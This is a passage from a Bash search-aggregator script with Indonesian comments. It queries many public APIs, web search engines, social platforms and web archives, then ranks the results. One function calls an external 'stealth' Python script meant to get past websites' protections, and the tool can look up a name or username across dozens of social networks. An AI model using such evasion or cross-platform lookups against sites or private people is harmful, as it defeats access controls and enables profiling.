  [ -n "${GITHUB_TOKEN:-}" ] && h=(-H "Authorization: Bearer $GITHUB_TOKEN")
  fetch "${h[@]}" "https://api.github.com/search/repositories?q=$(urlenc "$1")&per_page=10" \
    | jq '.items | map({title:.full_name, url:.html_url, snippet:(.description // ""), date:.pushed_at})'
}

src_gitlab() {
  fetch "https://gitlab.com/api/v4/projects?search=$(urlenc "$1")&per_page=8&order_by=last_activity_at" \
    | jq 'map({title:.path_with_namespace, url:.web_url, snippet:(.description // ""), date:(.last_activity_at // "")})'
}

src_npm() {
  fetch "https://registry.npmjs.org/-/v1/search?text=$(urlenc "$1")&size=8" \
    | jq '(.objects // []) | map(.package | {title:.name, url:(.links.npm // ("https://www.npmjs.com/package/"+.name)),
        snippet:(.description // ""), date:(.date // "")})'
}

src_osm() {
  fetch "https://nominatim.openstreetmap.org/search?q=$(urlenc "$1")&format=json&limit=5" \
    | jq 'map({title:.display_name, url:("https://www.openstreetmap.org/"+.osm_type+"/"+(.osm_id|tostring)),
        snippet:("lat "+.lat+", lon "+.lon), date:""})'
}

src_openlibrary() {
  fetch "https://openlibrary.org/search.json?q=$(urlenc "$1")&limit=10" \
    | jq '.docs | map({title, url:("https://openlibrary.org"+.key),
        snippet:((.author_name // [])|join(", ")), date:((.first_publish_year // "")|tostring)})'
}

src_gbooks() {
  fetch "https://www.googleapis.com/books/v1/volumes?q=$(urlenc "$1")&maxResults=10" \
    | jq '(.items // []) | map({title:(.volumeInfo.title // "(tanpa judul)"), url:(.volumeInfo.infoLink // .selfLink),
        snippet:((.volumeInfo.authors // [])|join(", ")), date:(.volumeInfo.publishedDate // "")})'
}

src_crossref() {
  fetch "https://api.crossref.org/works?query=$(urlenc "$1")&rows=10" \
    | jq '.message.items | map({title:((.title // [])[0] // "(tanpa judul)"), url:.URL,
        snippet:((."container-title" // [])[0] // ""), date:(.created."date-time" // "")})'
}

src_openalex() {
  fetch "https://api.openalex.org/works?search=$(urlenc "$1")&per-page=10" \
    | jq '(.results // []) | map({title:(.display_name // "(tanpa judul)"), url:(.doi // .id),
        snippet:(.primary_location.source.display_name // ""), date:((.publication_year // "")|tostring)})'
}

src_europepmc() {
  fetch "https://www.ebi.ac.uk/europepmc/webservices/rest/search?query=$(urlenc "$1")&format=json&pageSize=8" \
    | jq '(.resultList.result // []) | map({title:(.title // "(tanpa judul)"),
        url:("https://europepmc.org/article/"+.source+"/"+.id), snippet:(.authorString // ""), date:((.pubYear // "")|tostring)})'
}

# --- Hanya aktif saat kueri berupa URL/domain: arsip & alamat langsung ---
is_url_like() { [[ $1 =~ ^(https?://)?[A-Za-z0-9.-]+\.[A-Za-z]{2,}([/:?#].*)?$ ]] && [[ $1 != *" "* ]]; }

url_host() { # $1 = URL atau domain -> host polos (tanpa skema, tanpa www.)
  local u=$1
  [[ $u =~ ^https?:// ]] || u="http://$u"
  jq -rn --arg u "$u" '$u | capture("^https?://(?<h>[^/:?#]+)").h // ""' | sed 's/^www\.//'
}

# Mengambil satu URL yang diberikan pengguna secara langsung (menggunakan Python bypass jika ada)
src_direct_url() {
  local u=$1 html title desc py_script="$BASE/bypass-fetch.py" json_out
  [[ $u =~ ^https?:// ]] || u="https://$u"

  # Cek apakah skrip python bypass tersedia dan python3 terpasang
  if [ -f "$py_script" ] && command -v python3 >/dev/null 2>&1; then
    # Jalankan skrip Python stealth untuk menembus proteksi
    json_out=$(python3 "$py_script" "$u" 2>/dev/null)
    if [ $? -eq 0 ] && [ -n "$json_out" ]; then
      title=$(jq -r '.title // empty' <<< "$json_out")
      html=$(jq -r '.html // empty' <<< "$json_out")
      [ -z "$title" ] && title=$u
      # Ekstrak deskripsi dari HTML hasil render python
      desc=$(grep -ioE '<meta[^>]*name=["'"'"']description["'"'"'][^>]*>' <<< "$html" | head -n1 \
             | sed -E 's#.*content=["'"'"']([^"'"'"']*)["'"'"'].*#\1#i')
      jq -n --arg t "$title" --arg u "$u" --arg s "${desc:-}" \
        '[{title:($t|gsub("\\s+";" ")), url:$u, snippet:($s|gsub("\\s+";" ")), date:""}]'
      return 0
    fi
  fi

  # Fallback ke curl biasa jika python tidak dipakai
  html=$(fetch -L "$u") || return 1
  title=$(grep -ioE '<title[^>]*>[^<]*' <<< "$html" | head -n1 | sed -E 's#<title[^>]*>##i')
  desc=$(grep -ioE '<meta[^>]*name=["'"'"']description["'"'"'][^>]*>' <<< "$html" | head -n1 \
         | sed -E 's#.*content=["'"'"']([^"'"'"']*)["'"'"'].*#\1#i')
  [ -z "$title" ] && title=$u
  jq -n --arg t "$title" --arg u "$u" --arg s "${desc:-}" \
    '[{title:($t|gsub("\\s+";" ")), url:$u, snippet:($s|gsub("\\s+";" ")), date:""}]'
}

# Wayback Machine (Internet Archive): salinan lama dari URL/domain yang sama.
src_wayback() {
  local host=$1
  fetch "http://web.archive.org/cdx/search/cdx?url=$(urlenc "$host")&matchType=domain&collapse=urlkey&limit=15&output=json&filter=statuscode:200" \
    | jq '(if (length // 0) > 1 then .[1:] else [] end)
        | map({title:(.[2] + " (arsip " + (.[1]|tostring[0:8]) + ")"),
               url:("https://web.archive.org/web/" + (.[1]|tostring) + "/" + .[2]),
               snippet:"Wayback Machine", date:(.[1]|tostring)})'
}

# Common Crawl: indeks arsip web publik lain, dicari dengan cara serupa.
src_commoncrawl() {
  local host=$1 idx
  idx=$(fetch "https://index.commoncrawl.org/collinfo.json" | jq -r '.[0].cdx-api // empty') || return 1
  [ -z "$idx" ] && return 1
  fetch "$idx?url=$(urlenc "$host")&matchType=domain&limit=15&output=json&filter=status:200" \
    | jq -R -s 'split("\n") | map(select(length>0) | fromjson)
        | map({title:(.url // .urlkey), url:(.url // ""), snippet:"Common Crawl", date:(.timestamp // "")})
        | map(select(.url != ""))'
}

# --- Web umum tanpa key: DuckDuckGo (versi HTML). Bisa menolak jika dipakai terlalu sering. ---
src_ddg() {
  local out blk href t s u
  out=$(fetch -G --data-urlencode "q=$(webq "$1")" "https://html.duckduckgo.com/html/") || return 1
  grep -q 'anomaly' <<< "$out" && return 1   # halaman captcha / pembatasan
  printf '%s' "$out" | tr '\n\r\t' '   ' | sed 's#<a [^>]*class="result__a"#\n&#g' | grep '^<a ' | head -n 15 \
    | while IFS= read -r blk; do
        href=$(sed -n 's#^<a [^>]*href="\([^"]*\)".*#\1#p' <<< "$blk")
        [ -z "$href" ] && continue
        case "$href" in
          *"/y.js"*) continue ;;   # iklan
          *uddg=*) u=${href#*uddg=}; u=${u%%&*}; u=$(urldec "$u") ;;
          //*) u="https:$href" ;;
          *) u=$href ;;
        esac
        t=$(sed 's#^<a [^>]*>##; s#</a>.*##; s#<[^>]*>##g' <<< "$blk")
        s=$(sed -n 's#.*class="result__snippet"[^>]*>\(.*\)#\1#p' <<< "$blk" | sed 's#</a>.*##; s#<[^>]*>##g')
        printf '%s\t%s\t%s\n' "$t" "$u" "$s"
      done \
    | sed -e 's/&amp;/\&/g' -e 's/&lt;/</g' -e 's/&gt;/>/g' -e 's/&quot;/"/g' -e "s/&#x27;/'/g" -e "s/&#39;/'/g" \
    | jq -R -s 'split("\n") | map(select(length>0) | split("\t"))
        | map({title:.[0], url:.[1], snippet:(.[2] // ""), date:""})'
}

# --- Web umum (butuh key / server sendiri) ---
src_searxng() {
  local p
  for ((p = 1; p <= SEARXNG_PAGES; p++)); do
    if ! fetch "${SEARXNG_URL%/}/search?q=$(urlenc "$(webq "$1")")&format=json&language=${SEARXNG_LANG:-all}&pageno=$p"; then
      [ "$p" -eq 1 ] && return 1
      break
    fi
  done | jq -s '[.[] | (.results // [])[]] | map({title, url, snippet:((.content // "")|gsub("<[^>]+>";"")),
        date:(.publishedDate // "")})'
}

src_searxng_files() {
  local q; q="$(webq "$1") (filetype:pdf OR filetype:docx OR filetype:xlsx OR filetype:pptx)"
  fetch "${SEARXNG_URL%/}/search?q=$(urlenc "$q")&format=json&language=${SEARXNG_LANG:-all}" \
    | jq '(.results // [])[:15] | map({title, url, snippet:((.content // "")|gsub("<[^>]+>";"")),
        date:(.publishedDate // "")})'
}

src_tavily() {
  quota_take tavily || return 1
  jq -n --arg q "$(webq "$1")" '{query:$q, max_results:15, search_depth:"basic"}' \
    | fetch -X POST -H "Authorization: Bearer $TAVILY_API_KEY" -H "Content-Type: application/json" \
        -d @- "https://api.tavily.com/search" \
    | jq '(.results // []) | map({title, url, snippet:(.content // ""), date:""})'
}

src_brave() {
  quota_take brave || return 1
  fetch -H "X-Subscription-Token: $BRAVE_API_KEY" -H "Accept: application/json" \
    "https://api.search.brave.com/res/v1/web/search?q=$(urlenc "$(webq "$1")")&count=20" \
    | jq '(.web.results // []) | map({title:(.title|gsub("<[^>]+>";"")), url,
        snippet:((.description // "")|gsub("<[^>]+>";"")), date:(.age // "")})'
}

src_cse() { # $1=query $2=parameter tambahan (mis. &fileType=pdf)
  quota_take cse || return 1
  fetch "https://www.googleapis.com/customsearch/v1?key=$GOOGLE_CSE_KEY&cx=$GOOGLE_CSE_CX&q=$(urlenc "$(webq "$1")")$2" \
    | jq '(.items // []) | map({title, url:.link, snippet:(.snippet // ""), date:""})'
}

# --- Media sosial: API publik (tanpa key) ---
src_bluesky() {
  fetch "https://public.api.bsky.app/xrpc/app.bsky.actor.searchActors?q=$(urlenc "$1")&limit=10" \
    | jq '(.actors // []) | map({
        title:(if (.displayName // "") != "" then .displayName + " (@" + .handle + ")" else "@" + .handle end),
        url:("https://bsky.app/profile/" + .handle), snippet:(.description // ""), date:(.createdAt // "")})'
}

src_mastodon() { # sebagian instance mewajibkan login untuk pencarian; jika begitu sumber ini gagal
  fetch "https://mastodon.social/api/v2/search?q=$(urlenc "$1")&limit=10&resolve=false" \
    | jq '((.accounts // []) | map({title:((.display_name // "") + " (@" + .acct + ")"), url,
          snippet:((.note // "")|gsub("<[^>]+>";"")), date:(.created_at // "")}))
        + ((.statuses // []) | map({title:((.account.acct // "") + ": " + ((.content // "")|gsub("<[^>]+>";"")|.[0:90])),
          url, snippet:"", date:(.created_at // "")}))'
}

src_lemmy() {
  fetch "https://lemmy.world/api/v3/search?q=$(urlenc "$1")&type_=All&limit=10" \
    | jq '((.posts // []) | map({title:.post.name, url:.post.ap_id, snippet:("Lemmy · " + (.community.name // "")), date:(.post.published // "")}))
        + ((.communities // []) | map({title:.community.title, url:.community.actor_id, snippet:"komunitas Lemmy", date:(.community.published // "")}))
        + ((.users // []) | map({title:(.person.display_name // .person.name), url:.person.actor_id, snippet:"pengguna Lemmy", date:(.person.published // "")}))'
}

src_stackoverflow() {
  fetch "https://api.stackexchange.com/2.3/search/advanced?order=desc&sort=relevance&q=$(urlenc "$1")&site=stackoverflow&pagesize=10" \
    | jq "$JQ_DEC"'(.items // []) | map({title:(.title|dec), url:.link,
        snippet:((.tags // [])|join(", ")), date:((.creation_date // 0)|todate)})'
}

src_hf() {
  local q; q=$(urlenc "$1")
  {
    fetch "https://huggingface.co/api/models?search=$q&limit=6" \
      | jq 'map({title:.id, url:("https://huggingface.co/"+.id), snippet:"Model", date:(.lastModified // "")})' || echo '[]'
    fetch "https://huggingface.co/api/datasets?search=$q&limit=5" \
      | jq 'map({title:.id, url:("https://huggingface.co/datasets/"+.id), snippet:"Dataset", date:(.lastModified // "")})' || echo '[]'
    fetch "https://huggingface.co/api/spaces?search=$q&limit=5" \
      | jq 'map({title:.id, url:("https://huggingface.co/spaces/"+.id), snippet:"Space", date:(.lastModified // "")})' || echo '[]'
  } | jq -s 'add'
}

src_dailymotion() {
  fetch "https://api.dailymotion.com/videos?search=$(urlenc "$1")&limit=10&fields=title,url,created_time,owner.screenname" \
    | jq '(.list // []) | map({title, url, snippet:(."owner.screenname" // ""),
        date:((.created_time // "")|if type=="number" then todate else tostring end)})'
}

src_roblox() {
  fetch "https://users.roblox.com/v1/users/search?keyword=$(urlenc "$1")&limit=10" \
    | jq '(.data // []) | map({title:((.displayName // .name) + " (@" + .name + ")"),
        url:("https://www.roblox.com/users/" + (.id|tostring) + "/profile"), snippet:"Roblox", date:""})'
}

src_duolingo() { # hanya untuk username tanpa spasi
  [[ $1 == *" "* ]] && { echo '[]'; return 0; }
  fetch "https://www.duolingo.com/2017-06-30/users?username=$(urlenc "$1")" \
    | jq '(.users // []) | map({title:((.name // .username) + " (@" + .username + ")"),
        url:("https://www.duolingo.com/profile/" + .username), snippet:"Duolingo", date:""})'
}

src_youtube() { # pakai YouTube Data API bila ada key; jika tidak, YouTube dicari lewat mesin web
  [ -n "${YOUTUBE_API_KEY:-}" ] || return 1
  quota_take youtube || return 1
  fetch "https://www.googleapis.com/youtube/v3/search?part=snippet&type=video,channel&maxResults=10&q=$(urlenc "$(webq "$1")")&key=$YOUTUBE_API_KEY" \
    | jq "$JQ_DEC"'(.items // []) | map({title:(.snippet.title|dec),
        url:(if .id.videoId then "https://www.youtube.com/watch?v=" + .id.videoId else "https://www.youtube.com/channel/" + (.id.channelId // "") end),
        snippet:(.snippet.channelTitle // ""), date:(.snippet.publishedAt // "")})'
}

# ---------- daftar sumber ----------
# register  nama  kategori  fungsi  argumen  env-wajib  tersembunyi  varian(1=ya)  jeda-antar-varian(dtk)
SRC_NAME=(); SRC_CAT=(); SRC_FN=(); SRC_ARG=(); SRC_REQ=(); SRC_HIDE=(); SRC_VAR=(); SRC_GAP=()
register() {
  SRC_NAME+=("$1"); SRC_CAT+=("$2"); SRC_FN+=("$3"); SRC_ARG+=("$4"); SRC_REQ+=("$5")
  SRC_HIDE+=("${6:-0}"); SRC_VAR+=("${7:-0}"); SRC_GAP+=("${8:-0}")
}
source_active() { # $1 = daftar nama variabel (dipisah spasi); aktif jika semuanya terisi
  local v
  for v in $1; do [ -n "${!v:-}" ] || return 1; done
  return 0
}

register "Google News"        "Berita"            src_gnews       ""  "" 0 1
register "Google News (EN)"   "Berita"            src_gnews_en    ""  "" 0 1
register "Bing News"          "Berita"            src_bing        ""  "" 0 1
register "GDELT"              "Berita"            src_gdelt       ""  "" 0 1
register "Wikipedia ID"       "Ensiklopedia"      src_wiki        id  ""
register "Wikipedia EN"       "Ensiklopedia"      src_wiki        en  ""
register "Wikidata"           "Ensiklopedia"      src_wikidata    ""  ""
register "Wikimedia Commons"  "Gambar & media"    src_commons     ""  ""
register "Internet Archive"   "File publik"       src_archive     ""  ""
register "Reddit"             "Forum & diskusi"   src_reddit      ""  ""
register "Hacker News"        "Forum & diskusi"   src_hn          ""  ""
register "GitHub"             "Kode & repositori" src_github      ""  ""
register "GitLab"             "Kode & repositori" src_gitlab      ""  ""
register "npm"                "Kode & repositori" src_npm         ""  ""
register "OpenStreetMap"      "Lokasi"            src_osm         ""  ""
register "Open Library"       "Buku"              src_openlibrary ""  ""
register "Google Books"       "Buku"              src_gbooks      ""  ""
register "Crossref"           "Jurnal ilmiah"     src_crossref    ""  ""
register "OpenAlex"           "Jurnal ilmiah"     src_openalex    ""  ""
register "Europe PMC"         "Jurnal ilmiah"     src_europepmc   ""  ""
register "DuckDuckGo"         "Web"               src_ddg         ""  ""
register "SearXNG"            "Web"               src_searxng       "" "SEARXNG_URL"    0 1
register "SearXNG (file)"     "File publik"       src_searxng_files "" "SEARXNG_URL"
register "Tavily"             "Web"               src_tavily        "" "TAVILY_API_KEY" 0 1
register "Brave Search"       "Web"               src_brave         "" "BRAVE_API_KEY"  0 1 1.1
register "Google CSE (+file)" "Web"               src_cse           "" "GOOGLE_CSE_KEY GOOGLE_CSE_CX" 0 1
for _ft in "${FILE_TYPES[@]}"; do
  register "Google .$_ft" "File publik" src_cse "&fileType=$_ft" "GOOGLE_CSE_KEY GOOGLE_CSE_CX" 1
done

# ---------- media sosial ----------
# soc  nama  mode(api|web)  domain  [fungsi-api]  [env-wajib]
# api = dicari langsung lewat API publik; web = lewat mesin pencari web (site:domain)
# Reddit dan GitHub sudah ada di daftar sumber di atas.
SOC_NAME=(); SOC_MODE=(); SOC_DOM=(); SOC_FN=()
soc() {
  SOC_NAME+=("$1"); SOC_MODE+=("$2"); SOC_DOM+=("$3"); SOC_FN+=("${4:-}")
  [ "$2" = api ] && register "$1" "Media sosial" "$4" "" "${5:-}" 1
  return 0
}
soc "YouTube"        api "youtube.com youtu.be"           src_youtube        YOUTUBE_API_KEY
soc "Bluesky"        api "bsky.app"                       src_bluesky
soc "Mastodon"       api "mastodon.social"                src_mastodon
soc "Lemmy"          api "lemmy.world"                    src_lemmy
soc "Stack Overflow" api "stackoverflow.com"              src_stackoverflow
soc "Hugging Face"   api "huggingface.co"                 src_hf
soc "Dailymotion"    api "dailymotion.com"                src_dailymotion
soc "Roblox"         api "roblox.com"                     src_roblox
soc "Duolingo"       api "duolingo.com"                   src_duolingo
soc "WhatsApp"       web "chat.whatsapp.com wa.me"
soc "Instagram"      web "instagram.com"
soc "Facebook"       web "facebook.com"
soc "TikTok"         web "tiktok.com"
soc "Telegram"       web "t.me telegram.me"
soc "X (Twitter)"    web "x.com twitter.com"
soc "LinkedIn"       web "linkedin.com"
soc "Pinterest"      web "pinterest.com"
soc "Discord"        web "discord.com discord.gg"
soc "Threads"        web "threads.net threads.com"
soc "Quora"          web "quora.com"
soc "Twitch"         web "twitch.tv"
soc "Snapchat"       web "snapchat.com"
soc "Line"           web "line.me"
soc "KakaoTalk"      web "open.kakao.com"
soc "WeChat"         web "wechat.com weixin.qq.com"
soc "Signal"         web "signal.group signal.me"
soc "Tumblr"         web "tumblr.com"
soc "Medium"         web "medium.com"
soc "Substack"       web "substack.com"
soc "Clubhouse"      web "clubhouse.com joinclubhouse.com"
soc "VK"             web "vk.com"
soc "Vimeo"          web "vimeo.com"
soc "Rumble"         web "rumble.com"
soc "Kick"           web "kick.com"
soc "Kaggle"         web "kaggle.com"
soc "Hashnode"       web "hashnode.com hashnode.dev"
soc "Dev.to"         web "dev.to"
soc "Product Hunt"   web "producthunt.com"
soc "Behance"        web "behance.net"
soc "Dribbble"       web "dribbble.com"
soc "ArtStation"     web "artstation.com"
soc "VRChat"         web "vrchat.com"
soc "Goodreads"      web "goodreads.com"
soc "Wattpad"        web "wattpad.com"
soc "Letterboxd"     web "letterboxd.com"
soc "Strava"         web "strava.com"

backend_ok() {
  case "$1" in
    searxng) [ -n "${SEARXNG_URL:-}" ] ;;
    tavily)  [ -n "${TAVILY_API_KEY:-}" ] && quota_ok tavily ;;
    brave)   [ -n "${BRAVE_API_KEY:-}" ] && quota_ok brave ;;
    cse)     [ -n "${GOOGLE_CSE_KEY:-}" ] && [ -n "${GOOGLE_CSE_CX:-}" ] && quota_ok cse ;;
    *) return 1 ;;
  esac
}

# Mesin web yang dipakai untuk media sosial. Google CSE sengaja terakhir (kuota gratis kecil).
social_backend() {
  local b
  if [ "${SOCIAL_BACKEND:-auto}" != auto ] && backend_ok "$SOCIAL_BACKEND"; then echo "$SOCIAL_BACKEND"; return 0; fi
  for b in searxng brave tavily cse; do backend_ok "$b" && { echo "$b"; return 0; }; done
  return 1
}

soc_is_web() {
  local i=$1
  [ "${SOC_MODE[i]}" = web ] && return 0
  [ "${SOC_FN[i]}" = src_youtube ] && [ -z "${YOUTUBE_API_KEY:-}" ] && return 0
  return 1
}
soc_web_indices() { local i; for i in "${!SOC_NAME[@]}"; do soc_is_web "$i" && printf '%s\n' "$i"; done; }

build_soc_map() { # {"domain":"Nama platform",...}
  local i d
  for i in "${!SOC_NAME[@]}"; do
    for d in ${SOC_DOM[i]}; do printf '%s\t%s\n' "$d" "${SOC_NAME[i]}"; done
  done | jq -R -s -c 'split("\n") | map(select(length>0) | split("\t")) | map({(.[0]):.[1]}) | add'
}

# Satu kueri untuk beberapa platform sekaligus: "nama" (site:a OR site:b ...)
social_group() { # $1=mesin $2="indeks indeks ..." $3=kueri
  local be=$1 idxs=$2 q=$3 doms=() i d wq site map=${SOC_MAP:-}
  [ -z "$map" ] && map='{}'
  for i in $idxs; do for d in ${SOC_DOM[i]}; do doms+=("$d"); done; done
  wq=$(VARIANT=exact webq "$q")
  site=$(printf 'site:%s OR ' "${doms[@]}"); site="(${site% OR })"
  case "$be" in tavily|brave|cse) quota_take "$be" || return 1 ;; esac
  case "$be" in
    searxng)
      fetch "${SEARXNG_URL%/}/search?q=$(urlenc "$wq $site")&format=json&language=${SEARXNG_LANG:-all}" \
        | jq '(.results // []) | map({title, url, snippet:((.content // "")|gsub("<[^>]+>";"")), date:(.publishedDate // "")})' ;;
    brave)
      fetch -H "X-Subscription-Token: $BRAVE_API_KEY" -H "Accept: application/json" \
        "https://api.search.brave.com/res/v1/web/search?q=$(urlenc "$wq $site")&count=20" \
        | jq '(.web.results // []) | map({title:(.title|gsub("<[^>]+>";"")), url, snippet:((.description // "")|gsub("<[^>]+>";"")), date:(.age // "")})' ;;
    tavily)
      jq -n --arg q "$wq" --argjson d "$(printf '%s\n' "${doms[@]}" | jq -R . | jq -s -c .)" \
        '{query:$q, max_results:20, search_depth:"basic", include_domains:$d}' \
        | fetch -X POST -H "Authorization: Bearer $TAVILY_API_KEY" -H "Content-Type: application/json" -d @- "https://api.tavily.com/search" \
        | jq '(.results // []) | map({title, url, snippet:(.content // ""), date:""})' ;;
    cse)
      fetch "https://www.googleapis.com/customsearch/v1?key=$GOOGLE_CSE_KEY&cx=$GOOGLE_CSE_CX&q=$(urlenc "$wq $site")&num=10" \
        | jq '(.items // []) | map({title, url:.link, snippet:(.snippet // ""), date:""})' ;;
    *) return 1 ;;
  esac | jq --argjson m "$map" '
    map(. as $i
      | (try ($i.url | capture("^https?://(?<h>[^/?#]+)").h | ascii_downcase | sub("^www\\.";"")) catch "") as $h
      | ($m | to_entries | map(. as $e | select($h == $e.key or ($h | endswith("." + $e.key)))) | .[0].value // null) as $p
      | select($p != null) | . + {platform:$p})'
}

src_social_web() {
  local q=$1 be d idx=0 chunk
  be=$(social_backend) || return 1
  d=$(mktemp -d)
  while IFS= read -r chunk; do
    idx=$((idx + 1))
    if [ "$be" = brave ]; then   # Brave gratis: 1 permintaan per detik
      social_group "$be" "$chunk" "$q" > "$d/$idx.json" 2>/dev/null || echo '[]' > "$d/$idx.json"
      sleep 1.1
    else
      ( social_group "$be" "$chunk" "$q" > "$d/$idx.json" 2>/dev/null || echo '[]' > "$d/$idx.json" ) &
    fi
  done < <(soc_web_indices | xargs -n "$SOCIAL_GROUP_SIZE")
  wait
  jq -s 'add // []' "$d"/*.json 2>/dev/null || echo '[]'
  rm -rf "$d"
}

# ---------- menjalankan semua sumber aktif secara paralel ----------
TMP=""
SRC_COUNT=0

launch() { # nama kategori varian percaya jeda fungsi kueri argumen
  local name=$1 cat=$2 var=$3 trust=$4 delay=$5 fn=$6 q=$7 arg=$8
  SRC_COUNT=$((SRC_COUNT + 1))
  local id; id=$(printf '%03d' "$SRC_COUNT")
  printf '%s|%s|%s|%s' "$name" "$cat" "$var" "$trust" > "$TMP/$id.meta"
  (
    set -o pipefail
    QUOTA_MARK="$TMP/$id.quota"
    [ "$delay" != 0 ] && sleep "$delay"
    if VARIANT=$var "$fn" "$q" "$arg" > "$TMP/$id.tmp" 2>/dev/null; then mv "$TMP/$id.tmp" "$TMP/$id.json"
    else echo '[]' > "$TMP/$id.json"; : > "$TMP/$id.fail"; fi
    : > "$TMP/$id.done"
  ) &
}

run_scan() { # $1 = kueri ; hasil JSON di $REPORT
  local q=$1 started i v idx delay min variants=()
  started=$(date +%s%N)
  TMP=$(mktemp -d); SRC_COUNT=0
  read -ra variants <<< "$(variants_for_mode)"
  SOC_MAP=$(build_soc_map); export SOC_MAP

  for i in "${!SRC_NAME[@]}"; do
    source_active "${SRC_REQ[i]}" || continue
    [ "${SRC_CAT[i]}" = "Media sosial" ] && [ "$SOCIAL_SEARCH" = 0 ] && continue
    if [ "${SRC_VAR[i]}" = 1 ]; then
      idx=0
      for v in "${variants[@]}"; do
        variant_ok "$v" "$q" || continue
        delay=$(awk -v n="$idx" -v g="${SRC_GAP[i]}" 'BEGIN { print n * g }')
        launch "${SRC_NAME[i]}" "${SRC_CAT[i]}" "$v" 1 "$delay" "${SRC_FN[i]}" "$q" "${SRC_ARG[i]}"
        idx=$((idx + 1))
      done
    else
      launch "${SRC_NAME[i]}" "${SRC_CAT[i]}" exact 0 0 "${SRC_FN[i]}" "$q" "${SRC_ARG[i]}"
    fi
  done
  if [ "$SOCIAL_SEARCH" != 0 ] && social_backend >/dev/null && [ -n "$(soc_web_indices)" ]; then
    launch "Media sosial (web)" "Media sosial" exact 0 0 src_social_web "$q" ""
  fi
  if is_url_like "$q"; then
    launch "Alamat langsung" "URL/domain" exact 1 0 src_direct_url "$q" ""
    local host; host=$(url_host "$q")
    if [ -n "$host" ]; then
      launch "Wayback Machine" "URL/domain" exact 1 0 src_wayback "$host" ""
      launch "Common Crawl" "URL/domain" exact 1 0 src_commoncrawl "$host" ""
    fi
  fi

  # spinner + progres
  local frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏') n=0 done_n=0
  while :; do
    done_n=$(find "$TMP" -name '*.done' | wc -l)
    [ -t 1 ] && printf '\r  %s%s%s Memindai sumber %d/%d  ' "$CYN" "${frames[n % 10]}" "$R" "$done_n" "$SRC_COUNT"
    [ "$done_n" -ge "$SRC_COUNT" ] && break
    n=$((n + 1)); sleep 0.1
  done
  [ -t 1 ] && printf '\r\033[2K'

  # kumpulkan hasil tiap pekerjaan (sumber x varian)
  local f id name cat var trust tried failed_json
  : > "$TMP/all.ndjson"; : > "$TMP/fails"; : > "$TMP/oks"
  for f in "$TMP"/*.meta; do
    [ -e "$f" ] || continue
    id=$(basename "$f" .meta)
    IFS='|' read -r name cat var trust < "$f"
    jq -c --arg s "$name" --arg c "$cat" --arg v "$var" --argjson t "${trust:-0}" '
        (if type == "array" then . else [] end | map(select(type == "object" and ((.url // "") != "")))) as $it
        | if ($it | length) > 0 and ($it[0].platform // null) != null
          then ($it | group_by(.platform)[] | {source:.[0].platform, category:$c, variant:$v, trust:$t, items:.})
          else {source:$s, category:$c, variant:$v, trust:$t, items:$it} end' \
      "$TMP/$id.json" >> "$TMP/all.ndjson" 2>/dev/null
    if [ -f "$TMP/$id.fail" ] && [ ! -f "$TMP/$id.quota" ]; then echo "$name" >> "$TMP/fails"; else echo "$name" >> "$TMP/oks"; fi
  done
  local quota_json
  quota_json=$(cat "$TMP"/*.quota 2>/dev/null | sort -u | jq -R -s -c 'split("\n") | map(select(length>0))')
  [ -z "$quota_json" ] && quota_json='[]'
  # gagal hanya jika semua varian sumber itu gagal
  failed_json=$(sort -u "$TMP/fails" | grep -vxFf "$TMP/oks" | jq -R -s -c 'split("\n") | map(select(length>0) | {source:.})')
  [ -z "$failed_json" ] && failed_json='[]'
  tried=$(cat "$TMP"/*.meta 2>/dev/null | tr -s '|' '\n' | awk 'NR % 4 == 1' | sort -u | wc -l)

  case "$SEARCH_MODE" in akurat) min=2 ;; luas) min=0 ;; *) min=1 ;; esac
  local took=$(( ($(date +%s%N) - started) / 1000000 ))

  REPORT=$(jq -s --arg q "$q" --arg date "$(date -Iseconds)" --arg mode "$SEARCH_MODE" \
      --argjson min "$min" --argjson took "$took" --argjson tried "$tried" --argjson failed "$failed_json" \
      --argjson quota "$quota_json" '
    def norm: ascii_downcase | gsub("[-_/.+,:;()|\"]";" ") | gsub("%20";" ") | gsub("\\s+";" ") | sub("^ ";"") | sub(" $";"");
    def toks: [match("[\\p{L}\\p{N}]+";"g").string] | map(select(length >= 2)) | unique;
    def canon: (.url | ascii_downcase) | sub("#.*$";"") | sub("^https?://(www\\.)?";"") | sub("/+$";"");
    def hit($t): . as $k | ($t | test("(^| )" + $k + "( |$)"));
    # skor kecocokan: 3 frasa persis, 2 semua kata, 1 sebagian kata, 0 lemah
    def rank($qn; $qt; $trust):
      ((.title + " " + .snippet + " " + .url) | norm) as $t
      | (if ($qn | length) > 0 and ($t | contains($qn)) then 3
         elif ($qt | all(hit($t))) then 2
         elif (($qt | length) >= 2 and (($qt | map(select(hit($t))) | length) * 2 >= ($qt | length))) then 1
         else 0 end) as $r
      | if $trust and $r < 2 then 2 else $r end;

    ($q | norm) as $qn
    | ($qn | toks) as $t0
    | (if ($t0 | length) == 0 then [$qn] else $t0 end) as $qt
    # 1. normalisasi item + beri skor (hasil varian "persis" dari mesin web dipercaya minimal 2)
    | map(. as $r
        | .items |= map(
            {title:((.title // "(tanpa judul)") | tostring | gsub("\\s+";" ")),
             url:(.url | tostring),
             snippet:((.snippet // "") | tostring | gsub("\\s+";" ")),
             date:((.date // "") | tostring)}
            | . + {rank: rank($qn; $qt; ($r.trust == 1 and $r.variant == "exact"))}))
    # 2. gabungkan varian dari sumber yang sama
    | reduce .[] as $r ([];
        (map(.source) | index($r.source)) as $ix
        | if $ix == null then . + [{source:$r.source, category:$r.category, items:$r.items}]
          else .[$ix].items += $r.items end)
    # 3. URL kembar dipertahankan di sumber dengan skor terbaik, lalu saring sesuai mode
    | . as $S
    | (reduce ($S[] | .source as $s | .items[] | {k:canon, r:.rank, s:$s}) as $x ({};
        if (.[$x.k] == null or $x.r > .[$x.k].r) then .[$x.k] = {r:$x.r, s:$x.s} else . end)) as $win
    | $S
    | map(.source as $s | .items |= (
        (reduce .[] as $i ({seen:{}, out:[]};
            ($i | canon) as $k
            | if .seen[$k] or ($win[$k].s != $s) then .
              else (.seen[$k] = true | .out += [$i]) end) | .out)
        | map(select(.rank >= $min)) | sort_by(-.rank)))
    | map(select(.items | length > 0))
    | sort_by(-(.items | map(.rank) | max))
    | {query:$q, date:$date, mode:$mode, tookMs:$took, sourcesTried:$tried, found:., failed:$failed, quota:$quota}
    | . + {total:([.found[].items | length] | add // 0)}' "$TMP/all.ndjson")
  rm -rf "$TMP"; TMP=""
}

# ---------- tampilan hasil ----------
show_report() {
  local total found failed secs
